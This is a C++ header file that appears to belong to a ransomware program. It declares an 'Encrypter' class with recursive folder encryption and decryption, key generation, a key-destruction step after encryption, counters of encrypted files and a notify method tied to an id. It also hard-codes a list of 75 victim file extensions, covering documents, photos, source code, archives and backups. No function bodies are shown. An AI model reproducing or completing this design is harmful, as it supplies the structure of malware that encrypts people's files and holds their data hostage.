#ifndef ENCRYPTER_H
#define ENCRYPTER_H

#include <stdint.h>
#include "priority_queue.h"

// Encrypt file with the next extensions:
const char extensions[][7] = {
  "3ds", "3gp", "7z",  "asm", "avi", "backup", "bak",  "bat",  "bin",  "bmp",
  "cfg", "cmd", "c",   "cpp", "css", "csv",    "dia",  "diff", "doc",  "docx",
  "flv", "gci", "ggb", "gif", "gz",  "h",      "htm",  "html", "i3d",  "ico",
  "inf", "ini", "ino", "iso", "jar", "jpeg",   "jpg",  "js",   "json", "m2",
  "md",  "mkv", "mod", "mov", "mp3", "mp4",    "mpeg", "mpg",  "log",  "odt",
  "pas", "pdf", "php", "png", "ppt", "pptx",   "py",   "rar",  "raw",  "rtf",
  "rpx", "sav", "sql", "svg", "swf", "tar",    "txt",  "vbs",  "wav",  "wma",
  "wmv", "xls", "xml", "xps", "zip"
}; // 75

enum option { ENCRYPT, DECRYPT };
typedef const char* string;
typedef unsigned int uint;

class IController {
private:
  virtual void encryptFile(string) = 0;
  virtual void decryptFile(string) = 0;
public:
  virtual void setKey(uint8_t*) = 0; // for decryption key, use before decrypt
  virtual void generateKey() = 0; // encryption key
  virtual void destroyKey() = 0; // for encryption key, use after encrypt
  virtual void recursive(option, string) = 0; // encrypt/decrypt folder
  virtual uint getCantEncrypted() = 0;
  virtual uint getCantDecrypted() = 0;
  virtual void test() = 0;
};

class Encrypter : public IController {
private:
  uint8_t* key;
  uint cant_encrypted;
  uint cant_decrypted;
  PriorityQueue* pq;

  char* id;
  uint len;
  void notify(string);

  void AES_stream_encrypt(string);
  void AES_stream_decrypt(string);

  static Encrypter* instance;
  Encrypter();
  virtual void encryptFile(string);
  virtual void decryptFile(string);
public:
  static Encrypter* getInstance();
  virtual void setKey(uint8_t*);
  virtual void generateKey();
  virtual void destroyKey();
  virtual void recursive(option, string);
  virtual uint getCantEncrypted();
  virtual uint getCantDecrypted();
  virtual void test();
};

#endif
